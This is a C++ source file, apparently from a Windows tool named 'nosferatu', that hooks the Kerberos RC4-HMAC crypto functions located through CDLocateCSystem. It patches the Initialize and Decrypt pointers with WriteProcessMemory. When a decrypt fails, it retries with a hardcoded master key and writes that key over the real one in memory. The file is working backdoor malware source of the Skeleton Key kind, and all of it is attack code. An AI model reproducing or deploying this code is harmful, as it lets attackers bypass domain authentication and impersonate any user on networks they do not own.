#include "pch.h"
#include "nosferatu.h"

bool installedVirtualHook = false;
PVOID pOrigInit = LocalAlloc(LPTR, sizeof(PKERB_ECRYPT_INITIALIZE));
PVOID pOrigDecrypt = LocalAlloc(LPTR, sizeof(PKERB_ECRYPT_DECRYPT));
PVOID pHookInit = &HookInitialize;
PVOID pHookDecrypt = &HookDecrypt;

DWORD nosKey[] = { 0x1acda511, 0xa282c5f9, 0xefe01113, 0x171e925a };
LPCVOID keyPtr = nullptr;


NTSTATUS HookInitialize(LPCVOID pbKey, ULONG KeySize, ULONG MessageType, PVOID* pContext)
{
    NTSTATUS status = ((PKERB_ECRYPT_INITIALIZE)pOrigInit)(pbKey, KeySize, MessageType, pContext);

    if (status == STATUS_SUCCESS)
        keyPtr = pbKey;

    return status;
}

NTSTATUS HookDecrypt(PVOID pContext, LPCVOID pbInput, ULONG cbInput, PVOID pbOutput, ULONG* cbOutput)
{
    PVOID buffer = LocalAlloc(LPTR, cbInput);
    DWORD origOutputSize = *cbOutput;
    memcpy(buffer, pbInput, cbInput);

    NTSTATUS status = ((PKERB_ECRYPT_DECRYPT)pOrigDecrypt)(pContext, buffer, cbInput, pbOutput, cbOutput);

    if (status == STATUS_SUCCESS)
        return status;

    *cbOutput = origOutputSize;
    PVOID nosContext = nullptr;

    status = ((PKERB_ECRYPT_INITIALIZE)pOrigInit)(nosKey, 16, 1, &nosContext);

    if (status == STATUS_SUCCESS)
        status = ((PKERB_ECRYPT_DECRYPT)pOrigDecrypt)(nosContext, buffer, cbInput, pbOutput, cbOutput);

    if (status == STATUS_SUCCESS)
        WriteProcessMemory(GetCurrentProcess(), (LPVOID)keyPtr, &nosKey, 16, NULL);

    LocalFree(buffer);
    return status;
}

NTSTATUS HookCDLocateCSystem(ULONG Type, PKERB_ECRYPT* ppCSystem)
{
    if (installedVirtualHook)
        return CDLocateCSystem(Type, ppCSystem);

    PKERB_ECRYPT pCSystem;
    NTSTATUS status = CDLocateCSystem(0x17, &pCSystem);
    if (status != STATUS_SUCCESS || !pCSystem)
        return CDLocateCSystem(Type, ppCSystem);

    if (!WriteProcessMemory(GetCurrentProcess(), &pOrigInit, (LPCVOID) & (pCSystem->Initialize), sizeof(PKERB_ECRYPT_INITIALIZE), NULL))
        return CDLocateCSystem(Type, ppCSystem);

    if (!WriteProcessMemory(GetCurrentProcess(), &pOrigDecrypt, (LPCVOID) & (pCSystem->Decrypt), sizeof(PKERB_ECRYPT_DECRYPT), NULL))
        return CDLocateCSystem(Type, ppCSystem);

    if (!WriteProcessMemory(GetCurrentProcess(), &(pCSystem->Initialize), &pHookInit, sizeof(PKERB_ECRYPT_INITIALIZE), NULL))
        return CDLocateCSystem(Type, ppCSystem);

    if (!WriteProcessMemory(GetCurrentProcess(), &(pCSystem->Decrypt), &pHookDecrypt, sizeof(PKERB_ECRYPT_DECRYPT), NULL))
        return CDLocateCSystem(Type, ppCSystem);

    installedVirtualHook = true;
    return CDLocateCSystem(Type, ppCSystem);

}